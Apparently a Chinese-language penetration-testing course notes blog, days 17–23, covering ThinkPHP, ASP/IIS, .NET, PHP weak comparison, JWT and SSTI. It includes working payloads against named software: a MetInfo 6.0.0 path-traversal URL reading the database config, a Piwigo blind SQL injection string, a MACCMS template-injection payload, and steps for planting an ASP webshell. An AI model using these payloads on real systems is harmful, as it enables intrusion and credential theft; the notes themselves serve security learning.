<h1 id="第17天-PHP开发-个人博客项目-TP框架-路由访问-安全写法-历史漏洞"><a href="#第17天-PHP开发-个人博客项目-TP框架-路由访问-安全写法-历史漏洞" class="headerlink" title="第17天 PHP开发-个人博客项目&amp;TP框架&amp;路由访问&amp;安全写法&amp;历史漏洞"></a>第17天 PHP开发-个人博客项目&amp;TP框架&amp;路由访问&amp;安全写法&amp;历史漏洞</h1><h4 id="知识点：-3"><a href="#知识点：-3" class="headerlink" title="知识点："></a>知识点：</h4><p>1、基于TP框架入门安装搭建使用<br>2、基于TP框架内置安全写法评估<br>3、基于TP框架实例源码安全性评估</p>
<p>演示案例</p>
<ul>
<li>入门-简单了解-安装&amp;调试&amp;入口&amp;配置</li>
<li>使用-路由访问控制器&amp;对象&amp;函数&amp;参数</li>
<li>安全-SQL注入-不安全写法对比官方写法</li>
<li>安全-RCE执行-历史安全漏洞对比框架版本</li>
<li>实例-CMS源码-EyouCMS&amp;Fastadmin&amp;YFCMF</li>
</ul>
<p>#安全-$QL注入-不安全写法对比官方写法<br>1、参数过滤<br>2、内置过滤<br>#安全-RCE执行-历史安全漏洞对比框架版本<br>1、框架版本漏洞<br>2、框架写法安全<br>3、黑盒白盒看版本<br>#实例-CMS:源码-EyouCMS&amp;Fastadmin&amp;YFCMF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdminLTE后台管理系统</span><br><span class="line">1ayui后台管理系统</span><br><span class="line">thinkcmf</span><br><span class="line">H-ui,admin后台管理系统</span><br><span class="line">tpshop</span><br><span class="line">FsatAdmin</span><br><span class="line">eyoucms</span><br><span class="line">LarryCMS后台管理系统</span><br><span class="line">tpadmin,后台管理系统</span><br><span class="line">snake后台管理系统</span><br><span class="line">ThinkSNS</span><br><span class="line">DolphinPHP后台管理系统</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a>          thinkphp框架的所有漏洞整合</p>
<p><a href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a>   更全面更新的讲解了thinkphp的各种漏洞</p>
<p>ThinkPHP5.0在没有启用路由的情况下典型的URL访问规侧是：<br><a href="http://servername/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/[%E5%8F%82%E6%95%B0%E5%90%8D/]">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/]</a><br>thinkphp接收变量的写法<br>input(‘?get.id’);<br>input(‘?post.name’);通过thinkphp内置的写法可以过滤注入语句。（内置过滤）<br>thinkphp查询数据库语法<br>Db::table(‘think user’)-&gt;where(‘status’,1)-&gt;select（）;（即使数据接收没有过滤，带入数据库查询的时候仍进行过滤，内置过滤）<br>appplicaton&#x2F;config.php配置文件中含有app_debug和app_trace两个字段，开启用来调试验证。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用到TP框架找漏洞</span><br><span class="line">1、看写法</span><br><span class="line">2、看历史漏洞-&gt;版本</span><br><span class="line">版本获取知道？</span><br><span class="line">黑盒：</span><br><span class="line">判断是不是tp返回数据包</span><br><span class="line">怎么看版本-报错</span><br><span class="line">经验：URL地址</span><br></pre></td></tr></table></figure>

<h1 id="第18天：WEB攻防-ASP安全-MDB下载植入-IIS短文件名-写权限-解析"><a href="#第18天：WEB攻防-ASP安全-MDB下载植入-IIS短文件名-写权限-解析" class="headerlink" title="第18天：WEB攻防-ASP安全&amp;MDB下载植入&amp;IIS短文件名&amp;写权限&amp;解析"></a>第18天：WEB攻防-ASP安全&amp;MDB下载植入&amp;IIS短文件名&amp;写权限&amp;解析</h1><p>这个知识点其实差不多现在也可以直接跳过了，在现在这个时候已经很少有人去使用asp搭建网站了，主流的还得是java、python什么的，甚至php可能都比asp会更多了。</p>
<h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>1、ASP环境搭建组合<br>2、ASP-数据库下载&amp;植入<br>3、IIS-短文件&amp;解析&amp;写权限</p>
<p><a href="https://so.csdn.net/so/search?q=WEB%E5%AE%89%E5%85%A8&spm=1001.2101.3001.7020">WEB安全</a>攻防：<br>1、Weo源码<br>2、开发语言<br>3、中间件平台<br>4、<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B&spm=1001.2101.3001.7020">数据库类型</a><br>4、第三方插件或软件</p>
<h4 id="演示案例：-1"><a href="#演示案例：-1" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="ASP-数据库-MDB默认下载"><a href="#ASP-数据库-MDB默认下载" class="headerlink" title="ASP-数据库-MDB默认下载"></a>ASP-数据库-MDB默认下载</h6><p>常用组合：windows+ISS+ASP+Access（sqlserver）<br>原理：access数据库一般后缀名mdb（下载）asp asa(可以被执行)<br>mdb文件他在网站目录下默认数据库配置（database&#x2F;powereay2006.mdb）或者通过扫描目录得到<br>思路：如果我们知道这个数据库的地址，尝试可以下载获取数据库文件，获取当前管理员帐号密码信息</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/be974f59bf0db22217dce306e355ddd9--17d0--image-20240404165012897.png" alt="image-20240404165012897"></p>
<p>直接就可以在数据库里面去找到自己想要的信息</p>
<h6 id="ASP-数据库-ASP后门植入连接"><a href="#ASP-数据库-ASP后门植入连接" class="headerlink" title="ASP-数据库-ASP后门植入连接"></a>ASP-数据库-ASP后门植入连接</h6><p>流程：留言板写入一句话木马–菜刀连接数据库地址<br>原理：网站开启了asp解析，直接访问数据库文件会返回信息，写入一句话木马后进行连接<br>1、在留言板写入一句话木马</p>
<p>2、使用shell管理工具连接</p>
<h6 id="ASP-中间件-IIS短文件名探针安全漏洞"><a href="#ASP-中间件-IIS短文件名探针安全漏洞" class="headerlink" title="ASP-中间件-IIS短文件名探针安全漏洞"></a>ASP-中间件-IIS短文件名探针安全漏洞</h6><p>原理：Windows系统为了兼容16位MS-DOS程序，为文件名较长的文件和文件夹生成了对应的Windows 8.3短文件名。比如文件名direct~1.asp中间有一个波浪号，这种就是短文件名了。<br>使用脚本扫描网站目录造成敏感信息泄露（不同于使用字典扫描）<br>参考连接：<a href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a></p>
<h6 id="ASP-中间件IIS文件上传解析-安全漏洞"><a href="#ASP-中间件IIS文件上传解析-安全漏洞" class="headerlink" title="ASP-中间件IIS文件上传解析-安全漏洞"></a>ASP-中间件IIS文件上传解析-安全漏洞</h6><p>流程：发现网站存在上传点–上传asp木马–若存在文件名监测通过修改文件类型绕过检测–shell工具连接<br>例：1.jpg文件无法解析，修改为1.asp;.jpg即可绕过。或者1.jpg文件放在a.asp文件下也可进行解析<br>ASP-中间件-IIS配置目录读写-安全配置</p>
<h6 id="IS-put写入漏洞"><a href="#IS-put写入漏洞" class="headerlink" title="IS put写入漏洞"></a>IS put写入漏洞</h6><p>当网站为IIS6.0且开启写入权限、开启web服务拓展WebDAV则存在此漏洞</p>
<p>参考链接：<a href="https://blog.csdn.net/song123sh/article/details/123539837">https://blog.csdn.net/song123sh/article/details/123539837</a></p>
<h1 id="第19天WEB攻防-NET项目8-DLL反编译-未授权访问-配置调试报错"><a href="#第19天WEB攻防-NET项目8-DLL反编译-未授权访问-配置调试报错" class="headerlink" title="第19天WEB攻防-.NET项目8&amp;DLL反编译&amp;未授权访问&amp;配置调试报错"></a>第19天WEB攻防-.NET项目8&amp;DLL反编译&amp;未授权访问&amp;配置调试报错</h1><h4 id="知识点：-4"><a href="#知识点：-4" class="headerlink" title="知识点："></a>知识点：</h4><p>1、,NET配置调试-信息泄露<br>2、.NET源码反编译-DLL反编译<br>3、.NET常见安全问题-未授权访问</p>
<p>#判断用户的身份：<br>由于后台本身有多个功能文件页面<br>1、在每个文件里面添加判断代码<br>2、创建一个文件专门用来判断，其他文件包含调用它<br>#找未授权访问：<br>1、找那些文件没有包含验证代码文件<br>2、验证代码文件有没有可以绕过</p>
<h4 id="演示案例：-2"><a href="#演示案例：-2" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="NET项目-DLL文件反编译指向-代码特性"><a href="#NET项目-DLL文件反编译指向-代码特性" class="headerlink" title=".NET项目-DLL文件反编译指向-代码特性"></a>.NET项目-DLL文件反编译指向-代码特性</h6><p>工具：ILSpy<br>将.net相关文件后缀名为.dll的系列文件拖入该软件内即可实现反编译，以读取源码。</p>
<h6 id="NET项目-Web-config错误调试-信息泄露"><a href="#NET项目-Web-config错误调试-信息泄露" class="headerlink" title=".NET项目-Web.config错误调试-信息泄露"></a>.NET项目-Web.config错误调试-信息泄露</h6><p>&#x2F;webconfig文件中含有customError Mode 字段，该字段是用来开发过程中显示错误信息，以便于排查原因<br>当customError mode &#x3D;“Off”，则会先显示报错信息，造成信息泄露。</p>
<blockquote>
<p>在服务器上运行网站，远程访问该网站时候，提示webconfig文件的配置无法显示程序中具体的错误信息，原因是没有将标记的“mode”属性设置为“off”，网上查询标记的详细信息如下：</p>
<p>节点用于定义一些自定义错误信息的信息。此节点有Mode和defaultRedirect两个属性，其中defaultRedirect属性是一个可选属性，表示应用程序发生错误时重定向到的默认URL，如果没有指定该属性则显示一般性错误。Mode属性是一个必选属性，它有三个可能值，它们所代表的意义分别如下：<br>Mode 说明 On 表示在本地和远程用户都会看到自定义错误信息。 Off 禁用自定义错误信息，本地和远程用户都会看到详细的错误信息。<br>RemoteOnly 表示本地用户将看到详细错误信息，而远程用户将会看到自定义错误信息。<br>这里有必要说明一下本地用户和远程用户的概念。当我们访问asp.net应用程时所使用的机器和发布asp.net应用程序所使用的机器为同一台机器时成为本地用户，反之则称之为远程用户。在开发调试阶段为了便于查找错误Mode属性建议设置为Off，而在部署阶段应将Mode属性设置为On或者RemoteOnly，以避免这些详细的错误信息暴露了程序代码细节从而引来黑客的入侵</p>
</blockquote>
<h6 id="NET项目-身份验证未授权访问安全漏洞"><a href="#NET项目-身份验证未授权访问安全漏洞" class="headerlink" title=".NET项目-身份验证未授权访问安全漏洞"></a>.NET项目-身份验证未授权访问安全漏洞</h6><p>流程：在未登录状态通过修改URL访问需登录的地址跳转到登录界面–白盒测试找到验证登录的代码（找到未授权访问文件代码–寻找包含代码–逐一审查–找到登录代码）–发现代码可通过抓包修改cookie信息绕过–造成未授权访问</p>
<h1 id="第20天-WEB攻防-PHP特性-缺陷对比函数-CTF考点-CMS审计实例"><a href="#第20天-WEB攻防-PHP特性-缺陷对比函数-CTF考点-CMS审计实例" class="headerlink" title="第20天 WEB攻防-PHP特性&amp;缺陷对比函数&amp;CTF考点&amp;CMS审计实例"></a>第20天 WEB攻防-PHP特性&amp;缺陷对比函数&amp;CTF考点&amp;CMS审计实例</h1><h4 id="知识点：-5"><a href="#知识点：-5" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、过滤函致缺陷绕过<br>2、CTF考点与代码审计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#详细点：</span><br><span class="line">= =与=== ==弱类型对比 ===强类型对比</span><br><span class="line">md5 在PHP中md5不能用来处理数组，处理结果会返回null 所以存在MD5【1】=null=null</span><br><span class="line">intval intval() 函数用于获取变量的整数值。</span><br><span class="line">strpos strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</span><br><span class="line">in_array in_array() 函数搜索数组中是否存在指定的值。其中第三个参数若不设置为TURE则相当于弱类型判断</span><br><span class="line">preg_match preg_match 函数用于执行一个正则表达式匹配。可通过数组绕过</span><br><span class="line">str_replace str_replace() 函数替换字符串中的一些字符（区分大小写），不可迭代</span><br></pre></td></tr></table></figure>

<h4 id="演示案例1："><a href="#演示案例1：" class="headerlink" title="演示案例1："></a>演示案例1：</h4><p>ctfshow的题目（这里因为已经刷完题并且写了wp了，所以就不记上来了）</p>
<h4 id="演示案例2："><a href="#演示案例2：" class="headerlink" title="演示案例2："></a>演示案例2：</h4><h6 id="实践-代码审计-过滤缺陷文件读取"><a href="#实践-代码审计-过滤缺陷文件读取" class="headerlink" title="实践-代码审计-过滤缺陷文件读取"></a>实践-代码审计-过滤缺陷文件读取</h6><p>漏洞点在：MetInfo6.0.0&#x2F;include&#x2F;thumb.php?dir&#x3D;<br>漏洞代码文件位置：MetInfo6.0.0\app\system\include\module\old_thumb.class.php<br>有两次过滤，第一次把路径中…&#x2F;、.&#x2F;进行过滤，第二次路径中需要有http和不能存在.&#x2F;，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dir</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;./&#x27;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$_M</span>[<span class="string">&#x27;url&#x27;</span>][<span class="string">&#x27;site&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$dir</span>),<span class="number">0</span>,<span class="number">4</span>) == <span class="string">&#x27;http&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$dir</span>, <span class="string">&#x27;./&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/jpeg&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">flush</span>();</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以使用双写进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/MetInfo6.0.0/include/thumb.php?dir=…///http…///config\config_db.php</span><br><span class="line"></span><br><span class="line">/MetInfo/include/thumb.php?dir=.....///http\.....//\config\config_db.php</span><br></pre></td></tr></table></figure>

<p>经过过滤后变成了 <a href="http://127.0.0.1/MetInfo6.0.0/include/thumb.php?dir=%E2%80%A6/http%E2%80%A6/config%5Cconfig_db.php">http://127.0.0.1/MetInfo6.0.0/include/thumb.php?dir=…/http…/config\config_db.php</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/5f41dabeda66c8cc8e5875e43621f7e5--1cc9--image-20240404193535385.png" alt="image-20240404193535385">拓展链接：<a href="https://blog.csdn.net/m0_63241485/article/details/126580849">https://blog.csdn.net/m0_63241485/article/details/126580849</a></p>
<h6 id="开源相册piwigo-sql注入漏洞"><a href="#开源相册piwigo-sql注入漏洞" class="headerlink" title="开源相册piwigo sql注入漏洞"></a>开源相册piwigo sql注入漏洞</h6><p>原理：漏洞的分析看起来比较简单，是由于functions_rate.inc.php文件中的rate_picture函数没有对传入的$rate变量进行过滤，直接拼接到SQL中执行：代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &#x27;</span>.RATE_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span></span><br><span class="line">    .<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$anonymous_id</span>.<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$image_id</span>.<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$rate</span></span><br><span class="line">    .<span class="string">&#x27;,NOW())</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">pwg_query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">update_rating_score</span>(<span class="variable">$image_id</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &#x27;</span>.RATE_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span></span><br><span class="line">    .<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$anonymous_id</span>.<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$image_id</span>.<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$rate</span></span><br><span class="line">    .<span class="string">&#x27;,NOW())</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">pwg_query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">update_rating_score</span>(<span class="variable">$image_id</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>判断r a t e 是否是 rate是否是rate是否是conf[‘rate_items’]的项。而后面这个数组的值是配置文件里写死的。</p>
<p>看起来这句的功能是设置了一个rate变量的白名单。只能是0,1,2,3,4,5其中之一。这样子应该很安全才对。当然事实证明这样子写是不安全的。rate&#x3D;” 5′aaaaaaaaaaaaaaaaa” 时， inarray( rate &#x3D; “5’aaaaaaaaaaaaaaaaa “时，in_array(rate&#x3D;”5 ′aaaaaaaaaaaaaaaaa”时，inarray(rate, $conf[‘rate_items’]) 这个判断是返回True的。这是php里不同类型变量比较时候的一个特性。只要rate为array(0,1,2,3,4,5)便可以进行绕过，而in_array第三位未设置为true<br>1,1 and if(ascii(substr((select database()),1,1))&#x3D;112,1,sleep(3)));#<br>简言之：当字符串跟整型变量使用”&#x3D;&#x3D;”比较的时候，会将字符串转换成整型，再进行比较。</p>
<h1 id="第21天-WEB攻防-JavaWeb项目-JWT身份攻击-组件安全-访问控制"><a href="#第21天-WEB攻防-JavaWeb项目-JWT身份攻击-组件安全-访问控制" class="headerlink" title="第21天 WEB攻防-JavaWeb项目&amp;JWT身份攻击&amp;组件安全&amp;访问控制"></a>第21天 WEB攻防-JavaWeb项目&amp;JWT身份攻击&amp;组件安全&amp;访问控制</h1><h4 id="知识点：-6"><a href="#知识点：-6" class="headerlink" title="知识点："></a>知识点：</h4><p>1、JavaWeb常见安全及代码逻辑(通过抓包找到网站页面对应的文件地址以及功能代码)<br>2、目录遍历&amp;身份验证&amp;逻辑&amp;JWT<br>3、访问控制&amp;安全组件&amp;越权&amp;三方组件</p>
<h4 id="演示案例：-3"><a href="#演示案例：-3" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="JavaWeb-WebGoat8靶场搭建使用"><a href="#JavaWeb-WebGoat8靶场搭建使用" class="headerlink" title="JavaWeb-WebGoat8靶场搭建使用"></a>JavaWeb-WebGoat8靶场搭建使用</h6><p>搭建：下载jar包–使用java -jar webgoat-server-8.0.0.M26.jar –server.port&#x3D;9091 开启–浏览器访问127.0.0.1:9091&#x2F;WebGoat&#x2F;login.html 即可<br>详细搭建步骤见：<a href="https://blog.csdn.net/weixin_50012220/article/details/119209336">https://blog.csdn.net/weixin_50012220/article/details/119209336</a>          –好像搭建还得需要高点版本的java环境，java8和java11都不太行，而且搭建在虚拟机上好像是不能从本地上去访问到的。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-05/091f0354f3dfee15ffed99be242aef22--27f7--image-20240405104254959.png" alt="image-20240405104254959"></p>
<h6 id="安全问题-目录遍历-身份认证-JWT攻击"><a href="#安全问题-目录遍历-身份认证-JWT攻击" class="headerlink" title="安全问题-目录遍历&amp;身份认证-JWT攻击"></a>安全问题-目录遍历&amp;身份认证-JWT攻击</h6><p>1、上传文件时的目录遍历<br>通过上传回显和目标路径比较发现需要将文件上传到上一级目录–使用burp改包–…&#x2F;text<br>双写绕过</p>
<p>#身份认证<br>键值逻辑：使用键名键值进行对比验证错误<br>-JWT攻击：</p>
<p>1、签名没验证空加密</p>
<p>2、爆破密匙</p>
<p>3、KID利用<br><a href="https://www.cnblogs.com/vege/p/14468030.html">https://www.cnblogs.com/vege/p/14468030.html</a><br>此处因为赋值是写死的，而不是带入数据库中查询，所以可以通过修改键名称绕过（s2&#x3D;null and s3&#x3D;null 为真）</p>
<p>#访问控制<br>隐藏属性：前端页面的自慰限制显示<br>水平越权：同一级别用户权限的查看</p>
<h6 id="安全问题-访问控制-安全组件第三方组件"><a href="#安全问题-访问控制-安全组件第三方组件" class="headerlink" title="安全问题-访问控制&amp;安全组件第三方组件"></a><strong>安全问题-访问控制&amp;安全组件第三方组件</strong></h6><p>#安全组件<br>联想到前几年的Log4j2<br>#环境下载：<br><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p>
<h1 id="第22天-WEB攻防-JS项目-Node-JSi框架安全8识别审计-验证绕过"><a href="#第22天-WEB攻防-JS项目-Node-JSi框架安全8识别审计-验证绕过" class="headerlink" title="第22天 WEB攻防-JS项目&amp;Node.JSi框架安全8识别审计&amp;验证绕过"></a>第22天 WEB攻防-JS项目&amp;Node.JSi框架安全8识别审计&amp;验证绕过</h1><h4 id="知识点：-7"><a href="#知识点：-7" class="headerlink" title="知识点："></a>知识点：</h4><p>1、原生JS开发框架-安全条件<br>2、常见安全问题-前端验证：未授权</p>
<h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h6 id="1、什么是Js渗透测试？"><a href="#1、什么是Js渗透测试？" class="headerlink" title="1、什么是Js渗透测试？"></a>1、什么是Js渗透测试？</h6><p>在Javascript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞<br>JS开发的WEB应用和PHP,JAVA,NET等区别在于即没有源代码，也可以通过浏览器的查看<br>源代码获取真实的点。所以相当于JS开发的NEB应用属于白盒测试（默认有源码参考）</p>
<h6 id="3、如何判定JS开发应用？"><a href="#3、如何判定JS开发应用？" class="headerlink" title="3、如何判定JS开发应用？"></a>3、如何判定JS开发应用？</h6><p>插件wappalyzer<br>源代码简短<br>引入多个文件<br>一股有&#x2F;static&#x2F;js&#x2F;app.js等顺序的j文件<br>cookie中有connect.sid</p>
<h6 id="4、如何获取更多的JS文件？"><a href="#4、如何获取更多的JS文件？" class="headerlink" title="4、如何获取更多的JS文件？"></a>4、如何获取更多的JS文件？</h6><p>JsFinder<br>Packer-Fuzzer<br>扫描器后缀替换字典</p>
<h6 id="5、如何快速获取价值代码？"><a href="#5、如何快速获取价值代码？" class="headerlink" title="5、如何快速获取价值代码？"></a>5、如何快速获取价值代码？</h6><p>method:“get”<br>http.get(“<br>method:“post”</p>
<p>$.ajax</p>
<p>service.httphost</p>
<p>service.httget</p>
<h4 id="演示案例：-4"><a href="#演示案例：-4" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="安全条件可控变量-特定函数"><a href="#安全条件可控变量-特定函数" class="headerlink" title="安全条件可控变量&amp;特定函数"></a><strong>安全条件可控变量&amp;特定函数</strong></h6><h6 id="开发框架-Vulhub-Node-JS安全"><a href="#开发框架-Vulhub-Node-JS安全" class="headerlink" title="开发框架-Vulhub-Node.JS安全"></a><strong>开发框架-Vulhub-Node.JS安全</strong></h6><p>搭建vulhub靶场 存在任意文件读取漏洞–可读取服务器用户密码</p>
<h6 id="真实应用-APP应用直接重置密码"><a href="#真实应用-APP应用直接重置密码" class="headerlink" title="真实应用-APP应用直接重置密码"></a><strong>真实应用-APP应用直接重置密码</strong></h6><p>期货APP通过修改前端JS验证码绕过验证码认证、未授权访问</p>
<h6 id="真实应用-违法彩彩文件上传安全"><a href="#真实应用-违法彩彩文件上传安全" class="headerlink" title="真实应用-违法彩彩文件上传安全"></a><strong>真实应用-违法彩彩文件上传安全</strong></h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">扩展：CTF比赛中和js相关的主要就是js的原型链污染，以及沙盒逃逸，这两种其实都是差不多的原理，通过非法修改变量的值去达到一些非法的作用。</span><br></pre></td></tr></table></figure>

<h1 id="第23天-WEB攻防-Python考点-CTF与CMS-SSTI模版注入-PYC反编译"><a href="#第23天-WEB攻防-Python考点-CTF与CMS-SSTI模版注入-PYC反编译" class="headerlink" title="第23天 WEB攻防-Python考点&amp;CTF与CMS-SSTI模版注入&amp;PYC反编译"></a>第23天 WEB攻防-Python考点&amp;CTF与CMS-SSTI模版注入&amp;PYC反编译</h1><p><a href="https://www.cnblogs.com/bmjoker/p/13653563.html">https://www.cnblogs.com/bmjoker/p/13653563.html</a>       ssti实战</p>
<h4 id="知识点：-8"><a href="#知识点：-8" class="headerlink" title="知识点："></a>知识点：</h4><p>1、PYC文件反编译<br>2、Python-web-ssrr<br>3、SSr1模版注入利用分析</p>
<h4 id="演示案例：-5"><a href="#演示案例：-5" class="headerlink" title="演示案例："></a>演示案例：</h4><p>PY反编译-PYC编译文件反编译源码<br>SST1入门-原理&amp;分类&amp;检测&amp;分析&amp;利用<br>SsTi考点-CTF靶场-WestemnCTF日shrine<br>SST1考点-CMS源码-MACCMS V8.X执行<br>PY反编译-PYC编译文件反编译源码</p>
<h6 id="Pyc文件是py文件编译后生成的字节码文件-byte-code-Pyc文件经过pythonf解释器"><a href="#Pyc文件是py文件编译后生成的字节码文件-byte-code-Pyc文件经过pythonf解释器" class="headerlink" title="#Pyc文件是py文件编译后生成的字节码文件(byte code),Pyc文件经过pythonf解释器"></a>#Pyc文件是py文件编译后生成的字节码文件(byte code),Pyc文件经过pythonf解释器</h6><p>最终会生成机器码运行，因此pyc文件是可以跨平台部署的，类似Java的。c1a3文件，<br>一股如y文件改变后，都会重新生成中yc文件。<br>真题附件：<a href="http://pan.ba1du.com/s/1jGgB8Ds">http://pan.ba1du.com/s/1jGgB8Ds</a><br>反编译平台：<br><a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br><a href="http://tools.bugscaner.com/decompyle/">http://tools.bugscaner.com/decompyle/</a><br>反编译工具：<a href="https://g1thub.com/w1b1t1/uncompy1e2">https://g1thub.com/w1b1t1/uncompy1e2</a></p>
<h6 id="SSTI入门-原理-分类-检测-分析-利用"><a href="#SSTI入门-原理-分类-检测-分析-利用" class="headerlink" title="#SSTI入门-原理&amp;分类&amp;检测&amp;分析&amp;利用"></a>#SSTI入门-原理&amp;分类&amp;检测&amp;分析&amp;利用</h6><p>1、什么是SSTI?有什么漏司危害？</p>
<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为Web应用模<br>板内容的一部分，模板引擎在进行目标编泽這染的过程中，执行了用户播入的可以破怀模<br>板的语句，因而可影导数了散感信息泄露、代码执行、GetShe11等问题。其影响范围主<br>要取决于模版引擎的复杂性。<br>2、如何判断检测SSTI漏河的存在？<br>输入的数据会被浏览器利用当前脚本语言调用解析执行<br>3、SSTI会产生在那些语言开发应用？<br>-见上图<br>4、SSTI安全问题在生产环境那里产生？<br>存在模版引用的地方，如404错误页面展示<br>存在数据接收引用的地方，如模版解析获取参数数据<br><a href="https://blog.csdn.net/houyanhua1/article/details/85470175">https://blog.csdn.net/houyanhua1/article/details/85470175</a><br>url_for（）函数是用于构建操作指定函数的URL<br>get_flashed_messages（）函数是获取传递过来的数据<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#SSTI考点-CMs源码-MACCMS V8.X执行</span><br><span class="line">Payload:index.php?m=vod-searchswd=(if-dddd:phpinfo（）](endif-dddd</span><br><span class="line">1、根据传递的代码找指向文件</span><br><span class="line">2.index-&gt;vod-&gt;tpl-&gt;ifex-&gt;eval</span><br><span class="line">3、构适Payload带入ifex并绕过后执行</span><br><span class="line">实战中一般通过白盒审计代码明确变量，黑盒测试中很难发现。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">扩展：</span><br><span class="line">ssti作为ctf中常出现的题目，有着许多的变化等，也要多去看看。</span><br><span class="line">https://blog.csdn.net/qq_35493457/article/details/119938852  flask ssti</span><br><span class="line">https://www.cnblogs.com/bmjoker/p/13508538.html   ssti入门</span><br></pre></td></tr></table></figure>

